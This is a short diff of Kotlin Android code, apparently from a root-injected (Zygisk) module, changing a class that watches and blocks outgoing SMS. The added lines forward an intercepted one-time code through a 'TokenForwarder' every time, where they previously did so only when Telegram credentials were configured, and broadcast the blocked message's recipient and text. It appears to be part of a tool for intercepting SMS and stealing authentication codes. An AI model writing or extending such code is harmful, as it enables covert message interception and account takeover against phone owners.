@@ -1,6 +1,7 @@
 package com.hivirtus.zygiskmode
 
 import android.content.Context
+import android.content.Intent
 import android.database.ContentObserver
 import android.net.Uri
 import android.os.Handler
@@ -147,8 +148,15 @@ class SentSmsWatcher(private val context: Context) {
             java.io.File("/data/local/tmp/hivirtus_outgoing_blocked.flag").writeText("$dest|$body")
         } catch (_: Exception) {
         }
-        if (config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
-            TokenForwarder(configManager, context).forward(otp)
+        TokenForwarder(configManager, appContext).forwardOutgoingBlocked(otp)
+        try {
+            appContext.sendBroadcast(
+                Intent(BlockedSmsReceiver.ACTION_OUTGOING_BLOCKED)
+                    .setPackage(appContext.packageName)
+                    .putExtra(BlockedSmsReceiver.EXTRA_DEST, dest)
+                    .putExtra(BlockedSmsReceiver.EXTRA_BODY, body)
+            )
+        } catch (_: Exception) {
         }
     }
 
